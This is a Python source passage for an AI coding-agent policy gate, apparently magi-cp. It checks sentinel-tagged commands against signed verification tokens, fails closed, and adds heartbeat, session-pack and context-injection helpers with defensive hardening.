"""Local PreToolUse hook entry point.

CC pipes the hook event JSON on stdin. We parse `tool_input.command` for the
sentinel `FILE_COURT_<subject>_<payload_hash>`, then ask the cloud for a
verdict.

D63 follow-up note (subprocess safety): see ``execute_run_command`` below
for the run_command archetype's subprocess hardening — start_new_session
+ pgkill on timeout, byte-bounded pipe drains, scrubbed environment, and
a non-HOME default cwd. The brief's "kill child group on timeout" and
"stdout/stderr capped" requirements live there.

PR2 NOTE — sentinel-less policies (`sentinel_re=None`):
  As of D43/D44, `Policy.sentinel_re` is Optional and the wizard no longer
  auto-emits a default sentinel. A policy authored with `sentinel_re=None`
  produces NO local-gate hook trigger in this v2.x line — every PreToolUse
  silently `_allow()`s before any policy logic runs. The cloud-side runtime
  surfaces (e.g. `/verify_inline`, /verify/{step}) still enforce such policies
  end-to-end, but the local CC PreToolUse path requires a literal sentinel
  match in `tool_input.command`. Surfacing sentinel-less policies on the
  local gate is tracked as the "missing CC native surfaces" bullet of
  tracking-issue #1 and is intended for a future surface (out of scope for
  PR2/PR3). Until then, authors who need local CC enforcement MUST keep a
  `sentinel_re` on the policy.

PR4 NOTE — transitional legacy-token acceptance:
  PR4 drops cloud-side `matter` / `doc_hash` mirrors from token bodies. A
  WAL token signed by a pre-PR2 cloud carries ONLY the legacy fields and
  no longer matches by default. For the deploy window where some PR4 gates
  may still see legacy tokens that were cached pre-roll, the operator can
  set `MAGI_CP_ACCEPT_LEGACY_TOKEN_SHAPE_UNTIL=<unix_ts>`: tokens whose
  body has `matter == <subject>` and `doc_hash == <payload_hash>` will
  match through that epoch. Default-OFF (env unset → strict canonical).
  After the epoch elapses the env flips fail-closed automatically; this
  avoids a forgotten always-on bypass. The whole window is bounded by
  TOKEN_TTL_SECONDS=600 because expired tokens still get rejected by
  `verify_token`.

Output protocol:
  - Allow → exit 0 silently (CC continues normal permission flow).
  - Deny  → print {hookSpecificOutput:{permissionDecision:"deny",...}} JSON + exit 0.
  - Cloud unreachable → fail-closed deny ("license expiry = bundle expiry").
"""
from __future__ import annotations
import json
import os
import re
import signal
import sys
import urllib.error
import urllib.parse
import urllib.request

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey

from ..evidence import verify_token, Wal


def _cloud_url() -> str:
    """Resolve the cloud URL.

    Issue #1 P1 (#6): default is `http://127.0.0.1:8787` for the dev
    loop, but any non-loopback `http://` URL is refused at runtime —
    a man-in-the-middle on the first pubkey fetch would otherwise
    pin the attacker's key permanently. Operators wanting plain
    HTTP for an internal lab must set `MAGI_CP_ALLOW_PLAIN_HTTP=1`
    explicitly.
    """
    url = os.environ.get("MAGI_CP_CLOUD_URL", "http://127.0.0.1:8787")
    return url


def _enforce_url_scheme(url: str) -> None:
    """Refuse plain HTTP except for loopback or explicit opt-in.

    Raises ValueError on rejection; callers fail-closed.
    """
    if url.startswith("https://"):
        return
    if url.startswith("http://"):
        if os.environ.get("MAGI_CP_ALLOW_PLAIN_HTTP") == "1":
            return
        from urllib.parse import urlparse
        host = (urlparse(url).hostname or "").lower()
        if host in ("127.0.0.1", "localhost", "::1"):
            return
        raise ValueError(
            f"refusing plain HTTP to non-loopback host ({host!r}); set "
            f"MAGI_CP_CLOUD_URL to https:// or "
            f"MAGI_CP_ALLOW_PLAIN_HTTP=1 to override"
        )
    raise ValueError(f"unsupported MAGI_CP_CLOUD_URL scheme: {url!r}")


def _local_dir() -> str:
    return os.environ.get("MAGI_CP_LOCAL_DIR",
                          os.path.expanduser("~/.magi-cp/local"))


# Anchored sentinel: forbid trailing `_<more>` (e.g. FILE_COURT_S_P_v2) so the
# subject / payload_hash capture cannot silently drop tail bytes that change
# identity.
SENTINEL_RE = re.compile(r"\bFILE_COURT_([A-Za-z0-9]+)_([A-Za-z0-9]+)(?!_)\b")


# D82d follow-up — CC's hook stdout JSON contract is split by event:
#
#   PreToolUse  / PermissionRequest  → `hookSpecificOutput` carries the
#     refusal as `{"hookEventName":"…","permissionDecision":"deny",
#     "permissionDecisionReason":"…"}`. CC's permission flow consumes
#     that shape and refuses the call.
#   PostToolUse / PostToolUseFailure / PostToolBatch → CC does NOT
#     consume `hookSpecificOutput.permissionDecision` on these three
#     events (the tool already ran; there is no permission lane to gate).
#     Instead CC reads top-level `{"decision":"block","reason":"…"}` and
#     surfaces the reason to the model as retry-feedback.
#
# Hardcoding `hookEventName="PreToolUse"` here was the silent-fail-open
# the D82d matrix widening flagged: an operator authoring "block on
# PostToolUse + Bash" would reach a legal triple end-to-end through the
# wizard + IR loader + compiler, run the gate at runtime, see the gate
# emit the PreToolUse-shaped JSON, and CC would silently drop the
# stdout. The retry-feedback the wizard copy promised would never fire.
#
# Routing by `hook_event_name` from the inbound payload closes that
# gap. The retry-feedback event set + canonical shape live in
# `magi_cp.policy.cc_shapes` so the synthetic `test_runner` simulator
# (D77 "Test this policy") and the runtime stay in lockstep on what
# CC sees.
from ..policy.cc_shapes import (  # noqa: E402  (intentional late import after the section note)
    emit_deny_payload as _emit_deny_payload,
)


def _deny(reason: str, *, hook_event_name: str = "PreToolUse") -> None:
    """Emit the canonical deny JSON for `hook_event_name` and exit 0.

    `hook_event_name` defaults to "PreToolUse" so the legacy in-tree
    callers (sentinel verifier path) stay byte-identical.
    """
    print(json.dumps(
        _emit_deny_payload(reason, hook_event_name=hook_event_name),
        ensure_ascii=False,
    ))
    sys.exit(0)


def _allow() -> None:
    # silent → CC continues normal permission flow
    sys.exit(0)


def _load_pubkey_for_kid(kid: str | None) -> Ed25519PublicKey:
    """Fetch + cache cloud pubkey, indexed by kid so rotation is supported.

    A token carrying kid=X requires the public key whose sha256 prefix is X.
    Without kid (legacy/test path) we fall back to the active pubkey. Files
    are written 0o600 so a non-root local user cannot overwrite the trust
    anchor; if a cached file has loose mode, refuse and re-fetch.
    """
    local_dir = _local_dir()
    fname = f"pubkey-{kid}.pem" if kid else "pubkey.pem"
    cache = os.path.join(local_dir, fname)

    def _read_cached() -> Ed25519PublicKey | None:
        # Issue #1 P1 (#6): close the TOCTOU window between stat() and
        # open() by opening with O_NOFOLLOW + fstat() on the same
        # descriptor. A process running as the same UID can no longer
        # swap the file between the two syscalls.
        try:
            fd = os.open(cache, os.O_RDONLY | os.O_NOFOLLOW)
        except FileNotFoundError:
            return None
        except OSError:
            # ELOOP (symlink) / EACCES / etc — refuse fail-closed.
            return None
        try:
            st = os.fstat(fd)
            if (st.st_mode & 0o077) != 0:
                # world/group readable → refuse, force re-fetch.
                try:
                    os.remove(cache)
                except OSError:
                    pass
                return None
            data = b""
            while True:
                chunk = os.read(fd, 65536)
                if not chunk:
                    break
                data += chunk
            return serialization.load_pem_public_key(data)
        finally:
            os.close(fd)

    cached = _read_cached()
    if cached is not None:
        return cached

    os.makedirs(local_dir, exist_ok=True)
    url = _cloud_url()
    _enforce_url_scheme(url)
    with urllib.request.urlopen(url + "/pubkey", timeout=5) as r:
        data = json.loads(r.read())
        pem = data["pubkey_pem"]
        served_kid = data.get("kid")
    if kid and served_kid and served_kid != kid:
        # Cloud doesn't currently advertise old keys — pin mismatch = fail closed.
        raise ValueError(f"kid mismatch: token wants {kid!r}, cloud serves {served_kid!r}")
    # atomic 0600 write (no readable window)
    fd = os.open(cache, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)
    try:
        os.write(fd, pem.encode("utf-8"))
    finally:
        os.close(fd)
    return serialization.load_pem_public_key(pem.encode("utf-8"))


def _load_pubkey() -> Ed25519PublicKey:
    """Legacy entry point: no kid known yet, use active pubkey."""
    return _load_pubkey_for_kid(None)


def _legacy_token_window_active(now: int | None = None) -> bool:
    """True iff `MAGI_CP_ACCEPT_LEGACY_TOKEN_SHAPE_UNTIL` is set and the
    deadline hasn't passed.

    The env var holds a unix epoch (seconds). An unset / blank / malformed
    value → False (default-OFF fail-closed). Past-deadline → False (the
    window naturally expires; an operator who forgets to remove the env
    after the deploy still gets the canonical behaviour). This bounds the
    blast radius of a transitional bypass to the operator's chosen window.
    """
    raw = os.environ.get("MAGI_CP_ACCEPT_LEGACY_TOKEN_SHAPE_UNTIL", "")
    if not raw.strip():
        return False
    try:
        deadline = int(raw)
    except ValueError:
        return False
    import time as _time
    return (now if now is not None else int(_time.time())) < deadline


def _token_matches_keys(body: dict, *, subject: str, payload_hash: str) -> bool:
    """Match a token body against the canonical (subject, payload_hash) pair.

    Strict-canonical match is the default. When the legacy-shape window
    is active (see `_legacy_token_window_active`) we additionally accept
    bodies whose pre-PR2 `matter == subject` AND `doc_hash == payload_hash`
    — exactly mirroring how PR2 would have written the same logical token
    under the legacy schema. The legacy alias is OFF when:

      - the env knob is unset or expired (see helper), OR
      - either canonical field is already populated on the body (we never
        let a body that opts into canonical fields fall back to legacy
        comparison — that's the only way an attacker who controls a
        partial mix could otherwise trick a match).
    """
    if (body.get("subject") == subject
            and body.get("payload_hash") == payload_hash):
        return True
    if not _legacy_token_window_active():
        return False
    if body.get("subject") is not None or body.get("payload_hash") is not None:
        # The token opted into canonical fields but mismatched above —
        # do not silently fall back to legacy comparison.
        return False
    return (body.get("matter") == subject
            and body.get("doc_hash") == payload_hash)


def _find_signed_token(wal: Wal, pub: Ed25519PublicKey, *,
                       subject: str, payload_hash: str) -> dict | None:
    """Scan WAL for the *latest* citation_verify token bound to
    (subject, payload_hash) whose signature verifies under `pub` and which
    is not expired.

    PR4: only the canonical token shape is recognised by default. Tokens
    signed by a pre-PR2 cloud (legacy `matter`/`doc_hash` body fields) no
    longer match — operators upgrading past PR4 must roll forward gate +
    cloud together so the WAL flushes to the new shape. The brief PR2
    transition window where both pairs were mirrored on the same token
    is over.

    Transitional escape hatch: setting
    `MAGI_CP_ACCEPT_LEGACY_TOKEN_SHAPE_UNTIL=<unix_ts>` accepts legacy
    `matter`/`doc_hash` bodies until the given epoch. Default-OFF; see
    `_legacy_token_window_active`. TOKEN_TTL_SECONDS=600 still caps
    individual token lifetime regardless of the knob.

    Why latest, not first: a later `verdict=fail|review|deny` token for the
    same key MUST invalidate an earlier `pass` — otherwise a stale success
    could authorize a re-edited document. The latest decision wins.

    Kid-pinning is decided from the NEWEST verifying token (by iat). Each
    token's signature is independently verified inside `verify_token`, and
    `_load_pubkey_for_kid` already fail-closes on a kid-vs-cloud mismatch
    — dropping older-kid siblings is purely a defense-in-depth pin.
    """
    candidates: list[dict] = []
    for entry in wal.entries():
        if entry.get("step") != "citation_verify":
            continue
        body = verify_token(entry.get("token", ""), pub)
        if not body:
            continue
        if not _token_matches_keys(body, subject=subject,
                                   payload_hash=payload_hash):
            continue
        candidates.append(body)

    if not candidates:
        return None

    # Newest first by iat. Stable sort preserves WAL order for ties so we
    # still get deterministic behaviour when two tokens share an iat.
    candidates.sort(key=lambda b: b.get("iat", 0), reverse=True)
    newest = candidates[0]
    expected_kid = newest.get("kid")

    # Walk newest-first, taking the first kid-matching pass — any later
    # `review|deny` token for the same key already short-circuits the
    # selection because it sits above an earlier `pass` in the sorted list.
    for body in candidates:
        if body.get("kid") != expected_kid:
            continue
        if body.get("verdict") != "pass":
            # Latest decision is not a pass; stale earlier pass cannot win.
            return None
        return body
    return None


def decide(payload: dict):
    """Decide allow/deny from a hook payload, returning a canonical
    ``Verdict`` (does NOT exit).

    Factored out of ``evaluate`` for the P1 Codex adapter (design doc
    Section 3.4): both the CC dispatch path (``evaluate``) and the Codex
    dispatch path (``runtime.codex.run_codex_gate``) share this one
    decision engine so a sentinel that denies on CC denies identically on
    Codex — one engine, two surfaces.

    Side effect preserved from the legacy ``evaluate``: the session id CC
    handed us is persisted first (before the sentinel short-circuit) so
    the ``magi-cp session pack …`` CLI's tier-4 fallback has a producer.
    Best-effort; never affects the returned verdict.
    """
    from ..runtime.trait import Verdict

    # Persist the session id CC handed us on this hook so the
    # ``magi-cp session pack …`` CLI's tier-4 fallback
    # (``MAGI_CP_SESSION_FILE``) has a real producer. The gate is the
    # writer; the CLI only reads. Best-effort. Runs before the sentinel
    # short-circuit so EVERY observed hook (not just sentinel-bearing
    # commands) refreshes the last-seen id.
    from . import session_cache as _session_cache
    _session_cache.persist_session_id(payload.get("session_id") or "")

    hook_event_name = payload.get("hook_event_name") or "PreToolUse"
    # SessionStart: auto-activate the configured packs for this CC session
    # (opt-in via MAGI_CP_AUTO_ACTIVATE_PACKS) so the session shows up in the
    # dashboard + its session-scoped policies apply without a manual
    # /magi:pack-activate. Best-effort side-effect; SessionStart always
    # allows (it is observe/setup, never denies). Design:
    # 2026-07-03-sessionstart-auto-pack-activation-design (private planning repo).
    if hook_event_name == "SessionStart":
        _activate_session_packs(payload)
        return Verdict(decision="allow", hook_event_name=hook_event_name)
    cmd = payload.get("tool_input", {}).get("command", "")
    matches = list(SENTINEL_RE.finditer(cmd))
    if not matches:
        return Verdict(decision="allow", hook_event_name=hook_event_name)
    cloud = _cloud_url()
    if not cloud.startswith(("http://", "https://")):
        return Verdict(
            decision="deny",
            reason="invalid MAGI_CP_CLOUD_URL scheme",
            hook_event_name=hook_event_name,
        )
    try:
        pub = _load_pubkey()
    except (urllib.error.URLError, OSError, ValueError, json.JSONDecodeError) as e:
        return Verdict(
            decision="deny",
            reason=f"cloud unreachable ({type(e).__name__})",
            hook_event_name=hook_event_name,
        )

    wal = Wal(path=os.path.join(_local_dir(), "wal.jsonl"))
    # Every sentinel must individually validate. Multi-statement commands like
    # `FILE_COURT_A_X; FILE_COURT_B_Y` would otherwise allow Y to ride on X's
    # token (or vice versa).
    #
    # PR4: the sentinel's two captured groups are (subject, payload_hash).
    # For legal-vertical sentinels that's still (matter, doc_id) semantically
    # at the policy level, but the WAL lookup matches only on the canonical
    # token-body fields.
    for m in matches:
        subject, payload_hash = m.group(1), m.group(2)
        body = _find_signed_token(wal, pub, subject=subject,
                                  payload_hash=payload_hash)
        if body is None:
            return Verdict(
                decision="deny",
                reason=(
                    f"no signed citation_verify=pass for subject={subject} "
                    f"payload_hash={payload_hash}"
                ),
                hook_event_name=hook_event_name,
            )
    return Verdict(decision="allow", hook_event_name=hook_event_name)


def evaluate(payload: dict) -> None:
    """Decide allow/deny from a hook payload and emit the CC-canonical
    stdout envelope, exiting the process directly.

    Thin wrapper over ``decide``: an ``allow`` verdict exits silently
    (``_allow``) and a ``deny`` verdict prints the per-event canonical
    shape (``_deny``). Byte-identical to the pre-adapter ``evaluate``.
    """
    verdict = decide(payload)
    if verdict.decision == "allow":
        _allow()   # silent exit 0; CC continues
    _deny(verdict.reason, hook_event_name=verdict.hook_event_name)


def _managed_settings_path() -> str:
    return os.environ.get(
        "MAGI_CP_MANAGED_SETTINGS_PATH",
        os.path.expanduser("~/.claude/managed-settings.json"),
    )


def _endpoint_id() -> str | None:
    """Read MAGI_CP_ENDPOINT_ID from env or ~/.config/magi-cp/env.

    Operators set this once at install time; it's the stable identifier
    the cloud uses to track this gate's attestation. Returns None when
    unset (heartbeat then silently no-ops — the cloud just sees an
    "authored but not confirmed" entry for the policy fleet)."""
    env = os.environ.get("MAGI_CP_ENDPOINT_ID")
    if env:
        return env.strip() or None
    cfg = os.path.expanduser("~/.config/magi-cp/env")
    if not os.path.exists(cfg):
        return None
    try:
        with open(cfg, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "=" not in line:
                    continue
                k, _, v = line.partition("=")
                if k.strip() == "MAGI_CP_ENDPOINT_ID":
                    return v.strip().strip("\"'") or None
    except OSError:
        return None
    return None


def _auto_activate_packs() -> list[str]:
    """Read MAGI_CP_AUTO_ACTIVATE_PACKS (comma-separated pack ids) from env
    or ``~/.config/magi-cp/env``. Same source + precedence as
    ``_endpoint_id``. Empty / unset -> [] (auto-activation is pure opt-in;
    the floor pack is always-on regardless). Design:
    2026-07-03-sessionstart-auto-pack-activation-design (private planning repo).
    """
    def _split(raw: str | None) -> list[str]:
        if not raw:
            return []
        return [p.strip() for p in raw.split(",") if p.strip()]

    env = os.environ.get("MAGI_CP_AUTO_ACTIVATE_PACKS")
    if env is not None:
        return _split(env)
    cfg = os.path.expanduser("~/.config/magi-cp/env")
    if not os.path.exists(cfg):
        return []
    try:
        with open(cfg, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, _, v = line.partition("=")
                if k.strip() == "MAGI_CP_AUTO_ACTIVATE_PACKS":
                    return _split(v.strip().strip("\"'"))
    except (OSError, ValueError):
        # ValueError covers UnicodeDecodeError on a non-UTF-8 config file;
        # auto-activation must never raise (SessionStart is fail-open).
        return []
    return []


# Total wall-clock budget for auto-activation on a single SessionStart, so a
# hung/slow cloud cannot stall session start for (per-pack timeout x N packs).
_AUTO_ACTIVATE_TOTAL_BUDGET_S = 4.0


def post_session_pack_activate(
    session_id: str, pack_id: str, *,
    api_key: str | None = None, cloud_url: str | None = None,
    timeout: float = 2.0,
) -> bool:
    """Best-effort POST /session/{id}/packs/activate {pack_id}. Returns True
    on 200, False on any error. NON-BLOCKING: the caller (SessionStart hook)
    ignores failures so a session never fails on a missed activation.

    Auth: `api_key` falls back to `MAGI_CP_API_KEY`. URL scheme enforced
    (same plain-http guard as the heartbeat). Mirrors ``post_heartbeat``.
    """
    if not session_id or not pack_id:
        return False
    key = api_key or os.environ.get("MAGI_CP_API_KEY")
    if not key:
        return False
    base_url = cloud_url or _cloud_url()
    try:
        _enforce_url_scheme(base_url)
    except ValueError:
        return False
    # Quote the session id: it comes from the CC payload, so a stray "/",
    # "?", "#" or ".." must not reshape the request path against the API.
    safe_sid = urllib.parse.quote(session_id, safe="")
    url = f"{base_url.rstrip('/')}/session/{safe_sid}/packs/activate"
    try:
        data = json.dumps({"pack_id": pack_id}).encode("utf-8")
        req = urllib.request.Request(
            url, data=data, method="POST",
            headers={"Content-Type": "application/json", "X-Api-Key": key},
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return 200 <= r.status < 300
    except (urllib.error.URLError, OSError, ValueError):
        return False


def _activate_session_packs(payload: dict) -> None:
    """SessionStart side-effect: auto-activate the configured packs for this
    Claude Code session. Fail-open + best-effort: any error (unreachable
    cloud, missing key, activate failure) is swallowed so the session always
    proceeds. Pure side-effect; the caller emits the allow verdict.
    """
    # The ENTIRE body is guarded: auto-activation is a pure best-effort
    # side-effect and SessionStart must never raise, deny, or block a
    # session. Any failure (bad config bytes, cloud down, activate error) is
    # swallowed. A total wall-clock budget bounds the per-session latency so
    # a hung cloud cannot stall session start for 2s x N packs.
    try:
        session_id = payload.get("session_id") or ""
        packs = _auto_activate_packs()
        if not (session_id and packs):
            return
        import time as _time
        deadline = _time.monotonic() + _AUTO_ACTIVATE_TOTAL_BUDGET_S
        for pack_id in packs:
            if _time.monotonic() >= deadline:
                break
            try:
                post_session_pack_activate(session_id, pack_id)
            except Exception:
                # Never let one pack's failure break the session.
                pass
    except Exception:
        # Belt-and-suspenders: config read / anything unexpected -> no-op.
        pass


def _managed_settings_digest() -> str | None:
    """Sha256 of the gate's currently-loaded managed-settings.json.

    Returns None when the file is absent (first boot before /compile
    has populated it) — the heartbeat then carries a null digest, which
    is the canonical "endpoint authored but no settings loaded" signal.
    """
    import hashlib as _hashlib
    path = _managed_settings_path()
    if not os.path.exists(path):
        return None
    try:
        with open(path, "rb") as f:
            return _hashlib.sha256(f.read()).hexdigest()
    except OSError:
        return None


def _heartbeat_pidfile_path() -> str:
    return os.path.join(_local_dir(), "heartbeat.last")


def _read_last_heartbeat_ts() -> int | None:
    """Issue #1 P1 (#19): record last successful heartbeat ts so the
    helper can debounce frequent invocations without leaning on cron
    granularity."""
    path = _heartbeat_pidfile_path()
    if not os.path.exists(path):
        return None
    try:
        return int(open(path, "r", encoding="utf-8").read().strip())
    except (OSError, ValueError):
        return None


def _write_last_heartbeat_ts(ts: int) -> None:
    path = _heartbeat_pidfile_path()
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        # Atomic-ish write; we don't care about racing same-PID
        # invocations because each carries its own monotonically
        # advancing ts.
        with open(path, "w", encoding="utf-8") as f:
            f.write(str(ts))
    except OSError:
        # Disk full / permission — silently skip; the next successful
        # write replaces the file.
        pass


def _heartbeat_min_interval_s() -> int:
    """Operator-tunable debounce. Default 60s — cheap enough that a
    cron+launchd race won't hammer the cloud, generous enough that a
    full restart cycle still beats within the window."""
    raw = os.environ.get("MAGI_CP_HEARTBEAT_MIN_INTERVAL", "")
    if not raw.strip():
        return 60
    try:
        v = int(raw)
        return max(0, v)
    except ValueError:
        return 60


def post_heartbeat(*, api_key: str | None = None,
                    endpoint_id: str | None = None,
                    cloud_url: str | None = None,
                    timeout: float = 5.0,
                    force: bool = False) -> dict | None:
    """Best-effort heartbeat POST. Returns the response dict on 200,
    `None` on any error. Caller (cron / startup hook) ignores failures
    — a missed heartbeat is the cloud's signal, not a gate-side error.

    Auth: `api_key` falls back to `MAGI_CP_API_KEY` env. When neither
    is present we still return None (gate isn't tenant-enrolled yet).
    `endpoint_id` falls back to `_endpoint_id()` (env / config file).

    Issue #1 P1 (#6, #19):
      - URL scheme is enforced (`_enforce_url_scheme`) — plain HTTP
        to non-loopback hosts is rejected unless the operator opts
        in via `MAGI_CP_ALLOW_PLAIN_HTTP=1`.
      - Min-interval guard: skips when the previous successful
        heartbeat was less than `MAGI_CP_HEARTBEAT_MIN_INTERVAL`
        seconds ago. `force=True` bypasses the guard (used by the
        startup hook).
      - Replay-resistant payload: includes a fresh nonce + `ts` so
        the cloud's window check / nonce-dedup is meaningful.
    """
    eid = endpoint_id or _endpoint_id()
    if not eid:
        return None
    key = api_key or os.environ.get("MAGI_CP_API_KEY")
    if not key:
        return None
    # Min-interval debounce (#19).
    import time as _time
    now = int(_time.time())
    if not force:
        last = _read_last_heartbeat_ts()
        if last is not None and (now - last) < _heartbeat_min_interval_s():
            return None
    digest = _managed_settings_digest()
    body: dict = {"endpoint_id": eid, "ts": now}
    # Fresh nonce per call so the cloud-side replay check can dedupe
    # silently-replayed payloads.
    import secrets as _secrets
    body["nonce"] = _secrets.token_hex(16)
    if digest is not None:
        body["active_policy_digest"] = digest
    av = os.environ.get("MAGI_CP_AGENT_VERSION")
    if av:
        body["agent_version"] = av
    label = os.environ.get("MAGI_CP_ENDPOINT_LABEL")
    if label:
        body["label"] = label
    base_url = cloud_url or _cloud_url()
    try:
        _enforce_url_scheme(base_url)
    except ValueError:
        return None
    url = base_url + f"/endpoints/{eid}/heartbeat"
    req = urllib.request.Request(
        url, method="POST",
        data=json.dumps(body, ensure_ascii=False).encode("utf-8"),
        headers={
            "Content-Type": "application/json",
            "X-Api-Key": key,
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            result = json.loads(r.read())
            _write_last_heartbeat_ts(now)
            return result
    except (urllib.error.URLError, OSError, json.JSONDecodeError):
        return None


def _apply_runtime_flag(argv: list[str]) -> None:
    """Honor a leading ``--runtime <id>`` / ``--runtime=<id>`` flag.

    ``magi-cp gate --runtime codex`` is the documented convenience shape
    (design doc Section 6.2): it is exactly equivalent to setting
    ``MAGI_CP_RUNTIME=codex`` and dispatching. The Codex managed
    ``requirements.toml`` emits this flag on every hook command so the
    dispatcher resolves the Codex driver even when the payload sniff is
    ambiguous. Setting the env var here keeps a single detection path
    (``detect_runtime`` still reads ``MAGI_CP_RUNTIME``). Unknown / absent
    flags are a silent no-op so the plain CC invocation is unchanged.
    """
    i = 0
    while i < len(argv):
        tok = argv[i]
        if tok == "--runtime" and i + 1 < len(argv):
            os.environ["MAGI_CP_RUNTIME"] = argv[i + 1]
            return
        if tok.startswith("--runtime="):
            os.environ["MAGI_CP_RUNTIME"] = tok.split("=", 1)[1]
            return
        i += 1


def main() -> int:
    """Gate entry point: detect the runtime, dispatch to its driver.

    Design doc Section 3.4. ``MAGI_CP_CODEX_RUNTIME_ENABLED`` is default-ON,
    but ``detect_runtime`` still returns ``"cc"`` for a genuine Claude Code
    invocation (no ``MAGI_CP_RUNTIME=codex``, no Codex payload markers), so
    the CC path stays byte-identical to the pre-adapter ``cli`` contract:
    blank stdin -> silent allow, malformed JSON -> deny, otherwise run the
    policy path. An explicit falsy flag forces ``"cc"`` unconditionally (the
    kill switch); the Codex branch is entered only on a positive Codex
    runtime signal.
    """
    _apply_runtime_flag(sys.argv[1:])
    raw_stripped = sys.stdin.read().strip()
    # Lazy import so the runtime package (and its Codex module) never
    # loads on a plain CC invocation unless the dispatcher needs it.
    from ..runtime import detect_runtime
    runtime = detect_runtime(raw_stripped.encode("utf-8"), env=os.environ)
    if runtime == "codex":
        from ..runtime.codex import run_codex_gate
        return run_codex_gate(raw_stripped)
    elif runtime == "gjc":
        from ..runtime.gjc import run_gjc_gate
        return run_gjc_gate(raw_stripped)

    # ── Claude Code path (byte-identical to the legacy cli). ──────────
    if not raw_stripped:
        # Started outside a hook context; pass through.
        _allow()
    from ..runtime.cc import CCDriver
    try:
        payload = CCDriver().parse_hook_payload(
            raw_stripped.encode("utf-8"),
        ).raw
    except (json.JSONDecodeError, ValueError):
        _deny("malformed hook payload (json)")
    evaluate(payload)
    return 0   # unreachable; evaluate exits


def cli() -> int:  # pragma: no cover (CLI entry)
    return main()


def _context_templates_dir() -> str:
    """Resolve the sidecar directory where the compiler writes
    `<sha256>.txt` template bytes.

    The compiler writes them next to managed-settings.json under
    `context-templates/`. Operators with a custom managed-settings
    layout override the dir explicitly via
    `MAGI_CP_CONTEXT_TEMPLATES_DIR`.

    Compile-to-stage-then-move trap: `compile_files(policy_paths, "/tmp/m.json")`
    writes sidecars to `/tmp/context-templates/<sha>.txt`. When the
    operator later moves `m.json` to `~/.claude/managed-settings.json`
    without also moving the sidecar dir, this resolver falls back to
    `~/.claude/context-templates` and the shim's read fails silently
    (FileNotFoundError → return 0 with empty stdout, CC continues
    with no `additionalContext`). Two safe install patterns:
    (a) compile straight to the install target (`compile_files(paths,
    "~/.claude/managed-settings.json")` — sidecars land in the right
    place by default); (b) set `MAGI_CP_CONTEXT_TEMPLATES_DIR` on the
    runtime to wherever the sidecars actually live.
    """
    env = os.environ.get("MAGI_CP_CONTEXT_TEMPLATES_DIR")
    if env:
        return env
    return os.path.join(
        os.path.dirname(_managed_settings_path()),
        "context-templates",
    )


# Sha256 hex chars only — refuses path-traversal / ELOOP attempts on the
# `--id` argument fed in by the compiler-emitted command line. The
# compiler always passes a 64-hex sha; anything else means a tampered
# managed-settings.json.
_CONTEXT_ID_RE = re.compile(r"^[A-Fa-f0-9]{64}$")
# Shape gate for the `--event` arg. Matches the CC event-name grammar
# (PascalCase identifier-shaped, ≤64 chars). The shape pass is
# necessary but NOT sufficient — `context_write_cli` also cross-checks
# against `_SUPPORTED_EVENTS` so a well-formed name CC won't recognize
# (e.g. "NotARealHook") fails silently instead of emitting a hookSpecificOutput
# JSON keyed on a hook event CC will then drop or refuse. Old name was
# `_CONTEXT_EVENT_HEX_RE`, which was a misnomer (the regex matches
# event-name shapes, not hex).
_CONTEXT_EVENT_NAME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9_]{0,63}$")


def _emit_additional_context(event: str, template: str) -> None:
    """Print the CC-canonical hookSpecificOutput JSON carrying the
    template under `additionalContext` and exit 0.

    D57f-1: keyed on the actual `hookEventName` — CC's hook reader
    dispatches the additionalContext field per-event. UserPromptSubmit
    splices it into the next user prompt; SessionStart stitches it
    into the boot context; every other event records it on the
    downstream consumer the runtime exposes for that event.

    Single emission path so each event kind produces byte-identical
    JSON (modulo the event name + template). The compiler-emitted
    command line is the only caller, so we don't need to deal with
    multi-line splits.
    """
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": event,
            "additionalContext": template,
        }
    }, ensure_ascii=False))
    sys.exit(0)


def context_write_cli() -> int:
    """`magi-cp-context-write` entry point.

    D57f-1: the compiler emits a hook entry of the shape
    `magi-cp-context-write --event <Event> --id <sha256>` for every
    ContextInjectionPolicy. The shim resolves the sha back into the
    template bytes from the sidecar directory and emits the
    additionalContext JSON keyed on the event.

    Failure modes (all exit-0 + empty stdout, so a missing template
    cannot brick CC: empty JSON output means CC continues with no
    injected context):
      - sidecar dir missing
      - sidecar file missing
      - sidecar file empty / unreadable
      - sidecar file is world/group writable (refused)
      - malformed CLI args
      - `--event` value outside `_SUPPORTED_EVENTS`
        (well-formed-but-unknown event names exit silently rather than
        emit a `hookEventName` CC will drop or refuse)

    Args are parsed without argparse so a single missing flag does
    not raise SystemExit-2 (which CC would surface as a hook error).
    """
    argv = sys.argv[1:]
    event = ""
    tpl_id = ""
    i = 0
    while i < len(argv):
        arg = argv[i]
        if arg == "--event" and i + 1 < len(argv):
            event = argv[i + 1]
            i += 2
            continue
        if arg == "--id" and i + 1 < len(argv):
            tpl_id = argv[i + 1]
            i += 2
            continue
        i += 1
    if not event or not _CONTEXT_EVENT_NAME_RE.match(event):
        return 0
    # P1 follow-up: the shape regex was the only event-name gate; a
    # well-formed-but-unsupported name (e.g. "NotARealHook") would
    # still emit a `{hookSpecificOutput: {hookEventName: ..., ...}}`
    # JSON that CC then either silently drops (no enforcement; operator
    # sees a green check) or refuses at settings load (cascading
    # fail-open across every policy in the bundle). Cross-check the
    # IR's canonical `_SUPPORTED_EVENTS` so unknown names exit silently
    # (matches the existing fail-open-on-absence contract on missing
    # sidecars and malformed args).
    from ..policy.ir import _SUPPORTED_EVENTS
    if event not in _SUPPORTED_EVENTS:
        return 0
    if not tpl_id or not _CONTEXT_ID_RE.match(tpl_id):
        return 0
    side_dir = _context_templates_dir()
    path = os.path.join(side_dir, f"{tpl_id}.txt")
    try:
        # O_NOFOLLOW so a swapped symlink in the sidecar dir cannot
        # redirect us to a different file. The compiler writes the
        # sidecar files itself; a swap is the only way a different
        # template lands on disk.
